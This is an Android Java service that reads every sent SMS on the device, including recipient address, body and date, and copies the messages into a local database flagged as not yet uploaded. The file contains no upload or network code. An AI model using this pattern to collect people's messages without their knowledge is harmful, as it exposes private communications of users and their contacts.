package zaifsenpai.prs.General;

import android.app.IntentService;
import android.arch.persistence.room.Room;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.util.Log;

public class SmsGetService extends IntentService {

    private SmsDatabase smsDatabase;

    public SmsGetService() {
        this("SmsGetService");
    }

    public SmsGetService(String name) {
        super(name);
    }

    @Override
    protected void onHandleIntent(Intent workIntent) {
        smsDatabase = Room.databaseBuilder(SmsGetService.this,
                SmsDatabase.class,
                _Properties.GET_DATABASE_PATH(SmsGetService.this))
                .build();
        Log.d(_Properties.LOG_TAG, "Starting scrapper... ");
        ScrapSMS();
        Log.d(_Properties.LOG_TAG, "Scrapper Stopped...");
    }

    public void ScrapSMS() {
        Uri uriSMS_URI = Uri.parse("content://sms/sent");
        Cursor cur = getContentResolver().query(uriSMS_URI, null, null, null, null);
        Sms sms, tmp_sms;
        int Counter = 0;
        Log.d(_Properties.LOG_TAG, "Started scraping");

        while (cur != null && cur.moveToNext()) {
            Log.d(_Properties.LOG_TAG, "scrapped " + ++Counter + " of " + cur.getCount());
            sms = new Sms();
            sms.Sms_ID_Source = cur.getString(cur.getColumnIndex("_id"));
            sms.Address = cur.getString(cur.getColumnIndex("address"));
            sms.Body = cur.getString(cur.getColumnIndexOrThrow("body"));
            sms.Date = cur.getLong(cur.getColumnIndexOrThrow("date"));
            sms.IsUploaded = false;

            tmp_sms = smsDatabase.smsDao().GetSmsBySourceId(sms.Sms_ID_Source);
            if (tmp_sms == null)
                smsDatabase.smsDao().InsertSingleSms(sms);

            try {
                Thread.sleep(50);
            } catch (Exception ignored) {
            }
        }

        if (cur != null) {
            cur.close();
        }
    }
}
